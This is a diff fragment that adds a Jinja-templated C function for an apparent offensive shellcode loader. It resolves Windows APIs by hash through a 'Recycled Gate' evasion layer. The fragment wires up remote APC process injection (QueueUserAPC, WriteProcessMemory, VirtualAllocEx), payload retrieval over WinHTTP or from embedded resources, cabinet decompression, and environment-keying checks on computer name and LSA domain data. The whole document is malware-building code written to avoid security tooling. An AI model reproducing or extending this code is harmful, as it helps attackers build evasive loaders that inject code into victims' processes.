+    pfnWaitForSingleObject = (pWaitForSingleObject)RG_WaitForSingleObject;
+    pfnCloseHandle = (pCloseHandle)RG_CloseHandle;
+    
+    pfnCreateFileMappingW = (pCreateFileMappingW)RG_CreateFileMappingW;
+    pfnMapViewOfFile = (pMapViewOfFile)RG_MapViewOfFile;
+    
+    {% if execution_method == 'remoteapc' %}
+    pfnQueueUserAPC = (pQueueUserAPC)RG_QueueUserAPC;
+    pfnWriteProcessMemory = (pWriteProcessMemory)RG_WriteProcessMemory;
+    
+    pfnCreateProcessA = (pCreateProcessA)RG_GetProcAddressByHash(hKernel32, {{ hash_createprocessa }});
+    pfnVirtualAllocEx = (pVirtualAllocEx)RG_GetProcAddressByHash(hKernel32, {{ hash_virtualallocex }});
+    pfnVirtualProtectEx = (pVirtualProtectEx)RG_GetProcAddressByHash(hKernel32, {{ hash_virtualprotectex }});
+    pfnResumeThread = (pResumeThread)RG_GetProcAddressByHash(hKernel32, {{ hash_resumethread }});
+    
+    pfnGetLastError = (pGetLastError)RG_GetProcAddressByHash(hKernel32, {{ hash_getlasterror }});
+    
+    // RemoteAPC also uses NtCreateJobObject and others which are not wrapped here yet. 
+    // We should resolve them from NTDLL.
+    // For now, let's resolve them using standard GetProcAddress (via hash) to avoid crashes.
+    // Wait, we need hNtdll for these.
+    {% endif %} 
+    
+    {% if data_source == 'http' %}
+    DWORD WINHTTP_HASH = {{ hash_winhttp_dll }};
+    HMODULE hWinHttp = RG_GetModuleHandleByHash(WINHTTP_HASH);
+    if (hWinHttp == NULL && pfnLoadLibraryA != NULL) { hWinHttp = pfnLoadLibraryA("winhttp.dll"); }
+    if (hWinHttp != NULL) {
+        pfnWinHttpOpen = (pWinHttpOpen)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpopen }});
+        pfnWinHttpConnect = (pWinHttpConnect)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpconnect }});
+        pfnWinHttpOpenRequest = (pWinHttpOpenRequest)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpopenrequest }});
+        pfnWinHttpSendRequest = (pWinHttpSendRequest)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpsendrequest }});
+        pfnWinHttpReceiveResponse = (pWinHttpReceiveResponse)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpreceiveresponse }});
+        pfnWinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpquerydataavailable }});
+        pfnWinHttpReadData = (pWinHttpReadData)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpreaddata }});
+        pfnWinHttpCloseHandle = (pWinHttpCloseHandle)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpclosehandle }});
+        pfnWinHttpCrackUrl = (pWinHttpCrackUrl)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpcrackurl }});
+        pfnWinHttpSetOption = (pWinHttpSetOption)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpsetoption }});
+        pfnWinHttpQueryHeaders = (pWinHttpQueryHeaders)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpqueryheaders }});
+    }
+    {% endif %}
+
+    DWORD NTDLL_HASH = {{ hash_ntdll_dll }};
+    HMODULE hNtdll = RG_GetModuleHandleByHash(NTDLL_HASH);
+    pfnHeapAlloc = (pHeapAlloc)RG_GetProcAddressByHash(hNtdll, {{ hash_rtlallocateheap }});
+    pfnHeapFree = (pHeapFree)RG_GetProcAddressByHash(hKernel32, {{ hash_heapfree }});
+    
+    if (hNtdll != NULL) {
+        pfnRtlMoveMemory = (pRtlMoveMemory)RG_GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
+        pfnRtlZeroMemory = (pRtlZeroMemory)RG_GetProcAddressByHash(hNtdll, {{ hash_rtlzeromemory }});
+        
+        {% if execution_method == 'remoteapc' %}
+        pfnNtCreateJobObject = (pNtCreateJobObject)RG_GetProcAddressByHash(hNtdll, {{ hash_ntcreatejobobject }});
+        pfnNtSetInformationJobObject = (pNtSetInformationJobObject)RG_GetProcAddressByHash(hNtdll, {{ hash_ntsetinformationjobobject }});
+        pfnNtAssignProcessToJobObject = (pNtAssignProcessToJobObject)RG_GetProcAddressByHash(hNtdll, {{ hash_ntassignprocesstojobobject }});
+        {% endif %}
+    }
+    
+    {% if data_source == 'embedded' %}
+    pfnFindResourceA = (pFindResourceA)RG_GetProcAddressByHash(hKernel32, {{ hash_findresourcea }});
+    pfnLoadResource = (pLoadResource)RG_GetProcAddressByHash(hKernel32, {{ hash_loadresource }});
+    pfnLockResource = (pLockResource)RG_GetProcAddressByHash(hKernel32, {{ hash_lockresource }});
+    pfnSizeofResource = (pSizeofResource)RG_GetProcAddressByHash(hKernel32, {{ hash_sizeofresource }});
+    {% endif %} 
+    
+    {% if guardrails_needed %}
+    pfnGetComputerNameA = (pGetComputerNameA)RG_GetProcAddressByHash(hKernel32, {{ hash_getcomputernamea }});
+    pfnLstrlenA = (pLstrlenA)RG_GetProcAddressByHash(hKernel32, {{ hash_lstrlena }});
+    pfnGetEnvironmentVariableA = (pGetEnvironmentVariableA)RG_GetProcAddressByHash(hKernel32, {{ hash_getenvironmentvariablea }});
+    
+    DWORD ADVAPI32_HASH = {{ hash_advapi32_dll }};
+    HMODULE hAdvApi32 = RG_GetModuleHandleByHash(ADVAPI32_HASH);
+    if (hAdvApi32 == NULL && pfnLoadLibraryA != NULL) { 
+        hAdvApi32 = pfnLoadLibraryA("advapi32.dll"); 
+    }
+    if (hAdvApi32 != NULL) {
+        pfnLsaOpenPolicy = (pLsaOpenPolicy)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsaopenpolicy }});
+        pfnLsaQueryInformationPolicy = (pLsaQueryInformationPolicy)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsaqueryinformationpolicy }});
+        pfnLsaFreeMemory = (pLsaFreeMemory)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsafreememory }});
+        pfnLsaClose = (pLsaClose)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsaclose }});
+    }
+    {% endif %} 
+    
+    {% if bytecode_compression == 'mszip_compressor' %}
+    DWORD CABINET_HASH = {{ hash_cabinet_dll }};
+    HMODULE hCabinet = RG_GetModuleHandleByHash(CABINET_HASH);
+    if (hCabinet == NULL && pfnLoadLibraryA != NULL) hCabinet = pfnLoadLibraryA("cabinet.dll");
+    if (hCabinet) {
+         pfnCreateDecompressor = (pCreateDecompressor)RG_GetProcAddressByHash(hCabinet, {{ hash_createdecompressor }});
+         pfnDecompress = (pDecompress)RG_GetProcAddressByHash(hCabinet, {{ hash_decompress }});
+         pfnCloseDecompressor = (pCloseDecompressor)RG_GetProcAddressByHash(hCabinet, {{ hash_closedecompressor }});
+    }
+    {% endif %}
+
+    DEBUG_PRINT("API functions resolved (Recycled Gate active).");
+}
